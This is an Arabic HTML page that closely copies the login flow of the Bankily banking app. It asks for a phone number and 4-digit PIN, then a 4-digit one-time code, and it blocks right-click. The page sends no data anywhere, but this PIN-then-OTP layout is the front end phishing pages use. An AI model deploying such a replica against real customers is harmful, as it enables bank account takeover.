<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bankily - بنكيلي</title>
    <style>
        :root {
            --primary-teal: #0093a2; /* درجة الفيروزي الأصلية للتطبيق */
            --primary-yellow: #f8ba00; /* درجة الأصفر الأصلية للشريط السفلي */
            --bg-white: #ffffff;
            --text-gray: #7d7d7d;
        }

        * {
            box-sizing: border-box;
            font-family: 'Segoe UI', Roboto, Helvetica, sans-serif;
            margin: 0;
            padding: 0;
            /* منع تحديد النصوص كإجراء أمني */
            -webkit-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            user-select: none;
        }

        body {
            background-color: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        /* حاوية شاشة الهاتف */
        .app-container {
            width: 360px;
            height: 740px;
            background-color: var(--bg-white);
            border-radius: 24px;
            box-shadow: 0 12px 30px rgba(0,0,0,0.12);
            display: flex;
            flex-direction: column;
            overflow: hidden;
            position: relative;
        }

        /* شريط العنوان العلوي - يظهر في واجهة OTP ويختفي في تسجيل الدخول */
        .app-header {
            background-color: var(--primary-teal);
            height: 65px;
            display: none;
            align-items: center;
            justify-content: center;
            position: relative;
            color: white;
            font-size: 1.25rem;
            font-weight: 500;
        }

        .app-header .back-arrow {
            position: absolute;
            right: 20px;
            top: 50%;
            transform: translateY(-50%);
            font-size: 1.6rem;
            cursor: pointer;
            font-weight: bold;
            display: none;
        }

        /* المحتوى الداخلي */
        .app-content {
            flex: 1;
            padding: 20px 30px 20px 30px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        /* تنسيق وضبط مساحة الشعار ليظهر بشكل متناسق ومطابق للتطبيق الأصلي */
        .brand-logo-space {
            width: 100%;
            height: 140px;
            display: flex;
            justify-content: center;
            align-items: center;
            margin-top: 20px;
            margin-bottom: 25px;
        }

        .brand-logo-space img {
            max-width: 85%;
            max-height: 100%;
            object-fit: contain;
        }

        /* مجموعات الإدخال */
        .input-group {
            width: 100%;
            margin-bottom: 20px;
            position: relative;
            text-align: right;
        }

        .input-group label {
            display: block;
            font-size: 0.95rem;
            font-weight: bold;
            color: #111;
            margin-bottom: 12px;
        }

        /* حاوية الحقل مع الأيقونة */
        .input-wrapper {
            position: relative;
            width: 100%;
        }

        /* حقل الهاتف */
        .main-input {
            width: 100%;
            border: none;
            border-bottom: 1.5px solid #222;
            padding: 8px 45px 8px 15px;
            font-size: 1.2rem;
            outline: none;
            color: #333;
            background: transparent;
            direction: ltr !important;
            text-align: left !important;
            unicode-bidi: plaintext !important;
        }

        .main-input::placeholder {
            color: #b8b8b8;
            font-size: 1.1rem;
            direction: ltr;
            text-align: left;
        }

        /* الأيقونات المعدلة جهة اليمين لتطابق الصور تماماً */
        .field-icon {
            position: absolute;
            right: 5px;
            bottom: 8px;
            width: 24px;
            height: 24px;
            color: #111;
            z-index: 5;
        }

        /* موضع حاوية الرقم السري مصفوفة جهة اليمين تماماً بمحاذاة الأيقونة الجديد */
        .password-wrapper-box {
            display: flex;
            justify-content: flex-start;
            width: 100%;
            padding-right: 45px;
            margin-top: 10px;
        }

        /* ترتيب الأشرطة من اليمين إلى اليسار */
        .password-container {
            display: flex;
            gap: 15px;
            width: auto; 
            direction: rtl !important;
        }

        /* أشرطة الرقم السري الأربعة */
        .password-field {
            width: 28px;
            height: 30px;
            border: none;
            border-bottom: 2px solid #222;
            font-size: 1.4rem;
            font-weight: bold;
            outline: none;
            background: transparent;
            text-align: center !important; 
            direction: ltr !important;
            pointer-events: auto;
            user-select: none !important;
            border-radius: 0 !important;
        }
        
        .password-field::selection {
            background: transparent !important;
        }

        /* جملة "نسيت الرقم السري ؟" جهة اليمين */
        .forgot-password-box {
            width: 100%;
            text-align: right;
            padding-right: 45px; 
            margin-top: 20px; 
            margin-bottom: 15px;
        }

        .forgot-password-box a {
            color: #222;
            text-decoration: underline;
            font-size: 0.95rem;
            font-weight: 500;
        }

        /* الرابط السفلي المخصص للمستخدم الجديد */
        .register-link-box {
            margin-top: auto; 
            margin-bottom: 20px;
            text-align: center;
            width: 100%;
        }

        .register-link-box a {
            color: #222;
            text-decoration: underline;
            font-size: 0.92rem;
            font-weight: 500;
        }

        /* تخصيصات واجهة OTP الثانية المحدثة */
        .otp-title {
            font-size: 1.05rem;
            font-weight: normal;
            color: #666;
            text-align: center;
            line-height: 1.7;
            margin-top: 40px;
            margin-bottom: 40px;
        }

        .otp-wrapper-box {
            display: flex;
            justify-content: center;
            width: 100%;
            margin-bottom: 40px;
        }

        /* إسناد خاصية LTR لحاوية الـ OTP لتنظيم اتجاه الكتابة والمؤشر تماماً */
        .otp-container {
            display: flex;
            gap: 15px;
            direction: ltr !important;
        }

        /* تنسيق أشرطة حقل الـ OTP وضبط خاصية LTR */
        .otp-field {
            width: 28px;
            height: 30px;
            border: none;
            border-bottom: 2px solid #222; /* إبقاء الخط السفلي فقط كشريط أفقي نظيف */
            font-size: 1.6rem;
            font-weight: bold;
            outline: none;
            background: transparent;
            direction: ltr !important;
            text-align: center !important;
            caret-color: #222 !important; 
            pointer-events: auto;
            user-select: none !important;
            border-radius: 0 !important;
        }
        
        .otp-field::selection {
            background: transparent !important;
        }

        .otp-timer-countdown {
            font-size: 1.2rem;
            font-weight: bold;
            color: #0c3e66; /* لون المؤقت الغامق المتناسق مع الواجهة الجديدة */
            margin-bottom: 25px;
            text-align: center;
            margin-top: 10px;
        }

        /* الزر السفلي الأصفر الثابت */
        .footer-button {
            background-color: var(--primary-yellow);
            color: #ffffff;
            border: none;
            width: 100%;
            height: 60px;
            font-size: 1.3rem;
            font-weight: bold;
            cursor: pointer;
            outline: none;
        }

        .footer-button:active {
            opacity: 0.9;
        }

        .hidden {
            display: none !important;
        }
    </style>
</head>
<body>

    <div class="app-container">
        
        <div class="app-header" id="appHeader">
            <span class="back-arrow" id="backArrow" onclick="switchToLogin()">&#12296;</span>
            <span id="titleText"></span>
        </div>

        <div id="loginSection" class="app-content">
            
            <div class="brand-logo-space">
                <img src="logo_bankily.jpeg" alt="Bankily Logo">
            </div>

            <div class="input-group">
                <label>اسم المستخدم أو رقم الهاتف</label>
                <div class="input-wrapper">
                    <input type="text" id="usernameInput" class="main-input" maxlength="8" placeholder="من 8 أرقام" oninput="cleanNumberInput(this)">
                    <svg class="field-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                        <circle cx="12" cy="12" r="10"/>
                        <path d="M18 19c0-2.21-2.69-4-6-4s-6 1.79-6 4"/>
                        <circle cx="12" cy="8" r="3"/>
                    </svg>
                </div>
            </div>

            <div class="input-group" style="margin-bottom: 5px;">
                <label>الرقم السري</label>
                <div class="input-wrapper">
                    <svg class="field-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                        <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
                        <path d="M7 11V7a5 5 0 0 1 9.9-1"/>
                    </svg>
                    
                    <div class="password-wrapper-box">
                        <div class="password-container">
                            <input type="password" class="password-field" maxlength="1" oninput="handlePasswordNavigation(this, 0)">
                            <input type="password" class="password-field" maxlength="1" oninput="handlePasswordNavigation(this, 1)">
                            <input type="password" class="password-field" maxlength="1" oninput="handlePasswordNavigation(this, 2)">
                            <input type="password" class="password-field" maxlength="1" oninput="handlePasswordNavigation(this, 3)">
                        </div>
                    </div>
                </div>
            </div>

            <div class="forgot-password-box">
                <a href="#">نسيت الرقم السري ؟</a>
            </div>

            <div class="register-link-box">
                <a href="#">مستخدم جديد ؟ سجل الآن!</a>
            </div>
        </div>

        <!-- واجهة الـ OTP المصححة والمعدلة لتدعم LTR ونقاط الإدخال الآمنة بدقة -->
        <div id="otpSection" class="app-content hidden">
            <p class="otp-title">أدخل رمز التأكيد المرسل إلى هاتف المحمول</p>

            <div class="otp-wrapper-box">
                <div class="otp-container">
                    <input type="password" inputmode="numeric" pattern="[0-9]*" class="otp-field" maxlength="1" oninput="handleOtpNavigation(this, 0)">
                    <input type="password" inputmode="numeric" pattern="[0-9]*" class="otp-field" maxlength="1" oninput="handleOtpNavigation(this, 1)">
                    <input type="password" inputmode="numeric" pattern="[0-9]*" class="otp-field" maxlength="1" oninput="handleOtpNavigation(this, 2)">
                    <input type="password" inputmode="numeric" pattern="[0-9]*" class="otp-field" maxlength="1" oninput="handleOtpNavigation(this, 3)">
                </div>
            </div>

            <p class="otp-timer-countdown">04:58 ثواني</p>

            <div class="register-link-box" style="margin-top: auto; margin-bottom: 20px;">
                <a href="#" style="color: #222; font-weight: 500;">إعادة إرسال رمز التأكيد</a>
            </div>
        </div>

        <button class="footer-button" id="submitBtn" onclick="onFooterButtonClick()">تسجيل الدخول</button>

    </div>

    <script>
        // --- حظر النقر بزر الماوس الأيمن والأوسط لحماية الواجهة والبيانات ---
        document.addEventListener('contextmenu', function(e) {
            e.preventDefault();
        });

        document.addEventListener('mousedown', function(e) {
            if (e.button === 1 || e.button === 2) {
                e.preventDefault();
                return false;
            }
        });

        // تنظيف مدخلات الأرقام لحقل الهاتف
        function cleanNumberInput(input) {
            input.value = input.value.replace(/[^0-9]/g, '');
        }

        // حركة التنقل التلقائي من اليمين إلى اليسار لحقول الرقم السري الأربعة
        function handlePasswordNavigation(current, currentIndex) {
            current.value = current.value.replace(/[^0-9]/g, '');
            const fields = document.querySelectorAll('.password-field');
            if (current.value.length === 1 && currentIndex < 3) {
                fields[currentIndex + 1].focus();
            }
        }

        document.querySelectorAll('.password-field').forEach((field, index) => {
            field.addEventListener('keydown', (e) => {
                if (e.key === "Backspace" && field.value.length === 0 && index > 0) {
                    document.querySelectorAll('.password-field')[index - 1].focus();
                }
            });
            field.addEventListener('dragstart', (e) => e.preventDefault());
            field.addEventListener('drop', (e) => e.preventDefault());
        });

        // تنظيم مدخلات حقول رمز التحقق OTP وحركة المؤشر باتجاه LTR متناسق
        function handleOtpNavigation(current, currentIndex) {
            current.value = current.value.replace(/[^0-9]/g, ''); // فلترة تمنع المدخلات غير الرقمية فوراً
            const fields = document.querySelectorAll('.otp-field');
            if (current.value.length === 1 && currentIndex < 3) {
                fields[currentIndex + 1].focus();
            }
        }

        document.querySelectorAll('.otp-field').forEach((field, index) => {
            field.addEventListener('keydown', (e) => {
                if (e.key === "Backspace" && field.value.length === 0 && index > 0) {
                    document.querySelectorAll('.otp-field')[index - 1].focus();
                }
            });
            field.addEventListener('dragstart', (e) => e.preventDefault());
            field.addEventListener('drop', (e) => e.preventDefault());
        });

        // التحقق عند الضغط على الزر الرئيسي
        function onFooterButtonClick() {
            const loginSection = document.getElementById('loginSection');
            const otpSection = document.getElementById('otpSection');
            const appHeader = document.getElementById('appHeader');
            const titleText = document.getElementById('titleText');
            const backArrow = document.getElementById('backArrow');
            const submitBtn = document.getElementById('submitBtn');

            if (!loginSection.classList.contains('hidden')) {
                const userVal = document.getElementById('usernameInput').value.trim();
                
                let passVal = "";
                document.querySelectorAll('.password-field').forEach(box => passVal += box.value.trim());

                if (userVal === "" || passVal === "") {
                    alert("عذراً! لا يمكن ترك الحقول فارغة. الرجاء إدخال رقم الهاتف والرقم السري كاملاً.");
                    return;
                }

                if (userVal.length !== 8) {
                    alert("يجب إدخال رقم الهاتف كاملاً والمكون من 8 أرقام.");
                    return;
                }
                if (passVal.length !== 4) {
                    alert("يجب إدخال الرقم السري كاملاً والمكون من 4 أرقام.");
                    return;
                }

                loginSection.classList.add('hidden');
                otpSection.classList.remove('hidden');
                
                appHeader.style.display = "flex";
                titleText.innerText = "رمز التحقق";
                backArrow.style.display = "block";
                submitBtn.innerText = "التحقق";
                
                // التركيز التلقائي على حقل الـ OTP الأول عند فتح الواجهة
                setTimeout(() => {
                    document.querySelectorAll('.otp-field')[0].focus();
                }, 100);
                
            } else {
                let otpCode = "";
                document.querySelectorAll('.otp-field').forEach(box => otpCode += box.value.trim());

                if (otpCode === "") {
                    alert("الرجاء إدخال رمز التحقق (OTP) المرسل إلى هاتفك.");
                    return;
                }

                if (otpCode.length !== 4) {
                    alert("الرجاء تعبئة حقل الـ OTP كاملاً (4 أرقام).");
                    return;
                }

                alert("تم التحقق بنجاح! جاري تسجيل الدخول...");
            }
        }

        // العودة لواجهة تسجيل الدخول
        function switchToLogin() {
            document.getElementById('loginSection').classList.remove('hidden');
            document.getElementById('otpSection').classList.add('hidden');
            document.getElementById('appHeader').style.display = "none";
            document.getElementById('titleText').innerText = ""; 
            document.getElementById('backArrow').style.display = "none";
            document.getElementById('submitBtn').innerText = "تسجيل الدخول";
        }
    </script>
</body>
</html>
